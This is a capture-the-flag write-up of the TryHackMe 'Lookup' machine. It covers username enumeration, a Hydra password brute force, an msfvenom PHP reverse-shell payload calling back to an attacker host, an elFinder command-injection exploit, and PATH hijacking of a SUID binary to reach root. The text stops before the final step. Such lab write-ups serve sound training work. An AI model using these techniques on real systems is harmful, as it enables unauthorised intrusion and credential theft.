> [Lookup](https://tryhackme.com/r/room/lookup) offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. 
> 
> Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.

# Information Gathering / Reconnaissance

First, we launch the nmap scan which shows us that a web server is running on **port 80** and a SSH server on **port 22** :

```bash
~ cat nmapAll.txt
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.10.97.9
Host is up (0.076s latency).

|_http-title: Did not follow redirect to http://lookup.thm
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

After adding the DNS entry in the `/etc/hosts` file, we can access to it and land on a classic login page :

![login page](/assets/img/tryhackme/ctf/lookup/2.png)

When we try discovering directories, it doesn't come up with anything, also after trying a few basic SQL injections.

However, we can see the mention *"Wrong password"* after we try the `admin:admin` credentials (instead of *"Wrong username or password"*) so we know that the admin account exists.

![wrong password](/assets/img/tryhackme/ctf/lookup/3.png)

So we test once again for SQL injections with this command : 

```shell
sqlmap -u "http://lookup.thm" --data="username=admin&password=test" --risk=3 --level=5
```

But again and without much surprise, it doesn't work. So if I cannot use the admin account that I found, there must be another account that I could use instead.

With the help of chatGPT, we can create a python script to test for valid usernames :

```python
import requests

# Target URL and endpoint
url = "http://lookup.thm/login.php"  # Replace with the actual URL
username_list = "/usr/share/wordlists/seclists/Usernames/Names/names.txt"  # File containing a list of potential usernames

# Custom headers (if needed)
headers = { 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari>
    }

# Unique error messages or response patterns
valid_response_indicator = "Wrong password"  # Adjust based on the observed response for valid usernames

def enumerate_usernames():
    with open(username_list, "r") as file:
        for username in file:
            username = username.strip()
            payload = {
                "username": username,
                "password": "invalidpassword"  # Use a wrong password to test the username
            }
            try:
                response = requests.post(url, data=payload)

                if valid_response_indicator in response.text:  # Adjust for error message or status
                    print(f"[+] Valid username found: {username}")
                elif "Wrong username" in response.text:
                    print(f"[-] Invalid username: {username}")
            except Exception as e:
                print(f"[!] Error testing {username}: {e}")

if __name__ == "__main__":
    enumerate_usernames()
```

After launching this script, we can see the **admin** username pop up (of course) but also another user named **jose** :

![admin user found](/assets/img/tryhackme/ctf/lookup/4.png "admin user is found")

![jose user found](/assets/img/tryhackme/ctf/lookup/5.png "jose user is found")

So we can start a simple bruteforce on it using **Hydra** and the **rockyou wordlist** :

```shell
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm -V http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password"
```

and it returns a valid password !
![jose password found](/assets/img/tryhackme/ctf/lookup/6.png)

We can now connect to it (again, you cannot reach the page if you don't add the new entry in the `/etc/hosts` file).
We land on this page with a bunch of *txt files* (there is nothing in the Trash tab) :

![files found](/assets/img/tryhackme/ctf/lookup/7.png)

In these different files, we can find what seems to be different credentials (for example jose's credentials in *thislogin.txt*) :

![jose credentials](/assets/img/tryhackme/ctf/lookup/8.png)

Then, looking at the *credentials.txt* we find this :

![think credentials](/assets/img/tryhackme/ctf/lookup/9.png)

We will try those credentials in the next step.

# Initial Access

This doesn't work on the web application. However, we can test it on the listening ssh server, but doesn't work either.
We can also see that we can upload files on it, so I try to upload a **php reverse shell** file that I crafted using **msfvenom**.

```shell
msfvenom -p php/reverse_php LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f raw > shell.php
```

The application is not accepting *.php* extensions so I change it but still cannot manage to trigger my netcat listener.

So, instead of continuing on this path, I search if there is any vulnerability for *ElFinder* and there are !

```shell
~ searchsploit elfinder
-----------------------------------------------------------------------------------------------------
 Exploit Title                                                              | Path
-----------------------------------------------------------------------------------------------------
 elFinder 2.1.47 - 'PHP connector' Command Injection                        | php/webapps/46481.py

 elFinder Web file manager Version - 2.1.53 Remote Command Execution        | php/webapps/51864.txt
-----------------------------------------------------------------------------------------------------
```

I decide to use the **Metasploit** exploit and manage to get a Meterpreter session opened under the **www-data** account thanks to the *exiftran command injection vulnerability*.

![Metasploit](/assets/img/tryhackme/ctf/lookup/11.png)

In the `/home` folder, there is the **think** user's folder in which we can find the **user.txt** that I cannot access for the moment because of my low privileges.
Since I got a problem with my Meterpreter shell and couldn't switch to bash, I decided to write a *php reverse shell* in the `/tmp` folder.

![Php Reverse Shell](/assets/img/tryhackme/ctf/lookup/12.png)

I could execute through this command and gain a reverse shell :
```shell
execute -f /usr/bin/php -a "/tmp/shell.php"
```
![nc](/assets/img/tryhackme/ctf/lookup/13.png)

Now I can switch to the **think** user thanks to the **.txt file** we previously found with the credentials but... It doesn't work either...

Once again, we move onto another path and search for privilege escalation methods. So let's list the binaries with SUID permissions :

![SUID](/assets/img/tryhackme/ctf/lookup/14.png)

Except for the usual binaries we always find in this kind of output, there is **pwm**.
When I execute it to see what happens, I get this result :

![pwm](/assets/img/tryhackme/ctf/lookup/15.png)

So we can see that this binary (executed with root privileges) is using the **id** command in order to retrieve the *username user ID*. Hence, we can maybe trick it into finding **think**'s ID because it uses the **PATH variable**.
For this, we will create a file named *id* in `/tmp` and write this :

```bash
#!/bin/bash 
echo "uid=33(think) gid=33(www-data) groups=33(www-data)"
```

Then `chmod 777 /tmp/id` and modify the **PATH variable** to :
```shell
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now, if we execute the binary once again, it displays :

![password list](/assets/img/tryhackme/ctf/lookup/16.png)

We get a list of the passwords of the **think** user ! One of them must be the user's password (SPOILER : yes it is...).

Using what we found, we can connect to the machine with this user on SSH. Next, we can retrieve the **first flag** in his `/home` directory.

![first flag](/assets/img/tryhackme/ctf/lookup/17.png)

# Privilege Escalation

Once that we obtained an access to the *think* user account, we need to dig further and escalate our privileges to root in order to read the last flag.

The first thing I try to do is a simple `sudo -l` to see if there is any binary that I could use to evelate my privileges. The command's output states that I have **ALL** permissions on a binary called **look**.

Then, using [GTFOBins](https://gtfobins.github.io/), I learn that this binary is used to read files as a **superuser**, how interesting for us!
Thanks to the power of [GTFOBins](https://gtfobins.github.io/), we easily find the **root flag** :
